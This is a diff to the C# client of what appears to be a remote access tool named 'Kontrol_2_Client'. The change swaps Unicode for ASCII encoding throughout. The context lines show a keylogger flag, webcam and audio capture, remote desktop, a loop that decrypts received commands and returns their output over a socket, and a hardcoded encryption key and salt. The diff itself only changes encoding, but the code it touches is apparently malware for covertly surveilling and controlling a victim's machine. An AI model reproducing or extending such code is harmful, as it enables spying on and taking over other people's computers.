@@ -261,7 +261,7 @@ namespace Kontrol_2_Client
         static byte[] fileBuffer;
         static FilterInfoCollection videoDevices;
         static VideoCaptureDevice videoSource;
-        static Encoding uniEncoder = Encoding.Unicode;
+        static Encoding uniEncoder = Encoding.ASCII;
         static WasapiLoopbackCapture internalSource = null;
         static WaveInEvent audioSource = null;
         static bool remoteDesktop, runKeyLogger = false;
@@ -488,7 +488,7 @@ namespace Kontrol_2_Client
                 }
                 if (true)
 				{
-					string cmd = Encoding.Unicode.GetString(recBuf);
+					string cmd = Encoding.ASCII.GetString(recBuf);
 					try
 					{
 						cmd = Decrypt(cmd);
@@ -831,7 +831,7 @@ namespace Kontrol_2_Client
 								//sdata += tempBuf + "\r";
 								//Send("cmd_out\n" + tempBuf);
 								byte[] header = { 0xFE, 0xF4 };
-								byte[] strBytes = Encoding.Unicode.GetBytes(tempBuf);
+								byte[] strBytes = Encoding.ASCII.GetBytes(tempBuf);
                                 byte[] data = new byte[strBytes.Length + 3];
 								Buffer.BlockCopy(header, 0, data, 0, 2);
 								Buffer.BlockCopy(strBytes, 0, data, 2, strBytes.Length);
@@ -1191,7 +1191,7 @@ namespace Kontrol_2_Client
         static string Encrypt(string text)
 		{
 			/*string key = "D(G+KbPeSg";
-			byte[] clearBytes = Encoding.Unicode.GetBytes(text);
+			byte[] clearBytes = Encoding.ASCII.GetBytes(text);
 			using (Aes encryptor = Aes.Create())
 			{
 				Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(key, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
@@ -1228,7 +1228,7 @@ namespace Kontrol_2_Client
 						cs.Write(cipherBytes, 0, cipherBytes.Length);
 						cs.Close();
 					}
-					text = Encoding.Unicode.GetString(ms.ToArray());
+					text = Encoding.ASCII.GetString(ms.ToArray());
 				}
 			}*/
 			return text;
@@ -1820,7 +1820,7 @@ namespace Kontrol_2_Client
 			string r = response;
 
 			string encrypted = Encrypt(r);
-			byte[] data = Encoding.Unicode.GetBytes(encrypted);
+			byte[] data = Encoding.ASCII.GetBytes(encrypted);
 			if (fo_mode != 1)
 				_clientSocket.Send(data);
 		}
